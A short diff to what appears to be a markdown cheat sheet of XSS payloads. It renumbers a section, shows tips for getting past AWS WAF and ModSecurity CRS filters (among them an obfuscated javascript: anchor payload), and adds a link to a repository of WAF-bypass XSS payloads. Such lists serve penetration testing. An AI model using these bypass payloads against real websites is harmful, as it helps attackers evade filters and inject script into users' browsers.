@@ -203,7 +203,7 @@ use tab url encode : %09
 SVG, img, iframe 
 ```
    
-### 5.Some WAF bypass:
+### 6.Some WAF bypass:
 ```
 @vanshitmalhotra | Bypass AWS WAF -// 
 Add "<!" (without quotes) before your payload and bypass that WAF. :)
@@ -232,3 +232,7 @@ rodolfoassis | ModSecurity CRS 3.2.0 PL1
 <a href="jav%0Dascript&colon;alert(1)">
 ``` 
 
+### 7.Some good stuffs:
+```
+https://github.com/Walidhossain010/WAF-bypass-xss-payloads   
+```
